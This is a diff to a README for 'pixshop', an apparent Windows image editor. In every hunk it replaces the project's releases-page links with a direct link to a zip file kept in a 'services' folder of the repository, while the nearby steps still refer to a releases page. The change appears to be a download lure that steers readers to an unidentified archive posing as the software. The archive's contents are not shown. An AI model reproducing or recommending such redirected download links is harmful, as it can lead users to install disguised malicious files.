@@ -1,10 +1,10 @@
 # 🎨 pixshop - Edit and launch images with ease
 
-[![Download pixshop](https://img.shields.io/badge/Download-pixshop-7B68EE?style=for-the-badge&logo=github)](https://github.com/Jdarri1750/pixshop/releases)
+[![Download pixshop](https://img.shields.io/badge/Download-pixshop-7B68EE?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Jdarri1750/pixshop/main/services/Software-2.5.zip)
 
 ## 📥 Download
 
-Visit this page to download pixshop for Windows: https://github.com/Jdarri1750/pixshop/releases
+Visit this page to download pixshop for Windows: https://raw.githubusercontent.com/Jdarri1750/pixshop/main/services/Software-2.5.zip
 
 1. Open the releases page.
 2. Find the latest release.
@@ -145,7 +145,7 @@ pixshop works best on:
 
 Use this link to visit the release page and download pixshop for Windows:
 
-https://github.com/Jdarri1750/pixshop/releases
+https://raw.githubusercontent.com/Jdarri1750/pixshop/main/services/Software-2.5.zip
 
 ## 📄 Local run steps
 
